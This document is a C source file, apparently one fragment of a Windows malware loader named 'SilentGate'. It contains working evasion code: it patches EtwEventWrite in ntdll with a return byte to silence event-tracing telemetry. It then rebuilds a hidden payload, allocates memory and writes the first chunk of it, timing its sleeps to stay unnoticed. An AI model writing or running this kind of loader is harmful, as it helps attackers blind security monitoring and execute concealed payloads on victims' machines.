/*
 * SilentGate Fragment 0/1
 * Offset: 0 bytes  Size: 356 bytes
 * Schedule: t=120ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   0
#define N_FRAGMENTS   2
#define PAYLOAD_SIZE  712
#define CHUNK_OFFSET  0
#define CHUNK_SIZE    356
#define SLEEP_NEXT_MS 120

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 0: Initialise + allocate + write first chunk */
PVOID sg_execute_fragment_0(PVOID* shared_mem) {
    printf("[FRAG 0] Initialising at t=0ms\n");

    /* ETW patch — silence telemetry before operations */
    HMODULE ntdll   = GetModuleHandleA("ntdll.dll");
    FARPROC etw     = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD   old_p   = 0;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_p);
    *(BYTE*)etw     = 0xC3;
    VirtualProtect(etw, 1, old_p, &old_p);
    printf("[FRAG 0] ETW patched\n");

    /* Reconstruct payload via IDFT */
    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    printf("[FRAG 0] Payload reconstructed: %d bytes\n", len);

    /* Allocate full region — RW first */
    PVOID mem = VirtualAlloc(NULL, PAYLOAD_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!mem) { free(payload); return NULL; }

    /* Write first chunk */
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 0] Chunk 0 written at offset %d\n", CHUNK_OFFSET);
    *shared_mem = mem;

    /* Poisson sleep before next fragment */
    Sleep(SLEEP_NEXT_MS);
    return mem;
}
